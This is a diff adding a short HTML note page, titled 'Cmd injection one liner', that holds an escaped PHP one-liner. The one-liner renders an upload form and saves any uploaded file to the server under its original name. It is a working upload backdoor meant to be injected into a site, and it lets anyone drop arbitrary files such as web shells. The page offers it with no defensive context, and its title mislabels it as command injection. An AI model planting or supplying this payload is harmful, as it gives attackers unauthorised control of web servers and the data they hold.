@@ -1,0 +1,7 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Cmd injection one liner</title>
+</head><body>one liner upload form<br/>
+<br/>
+&lt;FORM ENCTYPE=&quot;multipart/form-data&quot; ACTION=&lt;?php echo &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; ?&gt; METHOD=POST&gt;Send this file: &lt;INPUT NAME=&quot;userfile&quot; TYPE=&quot;file&quot;&gt;&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;&lt;/FORM&gt;&lt;?php move_uploaded_file($_FILES[&quot;userfile&quot;][&quot;tmp_name&quot;], $_FILES[&quot;userfile&quot;][&quot;name&quot;]); ?&gt;</body></html>
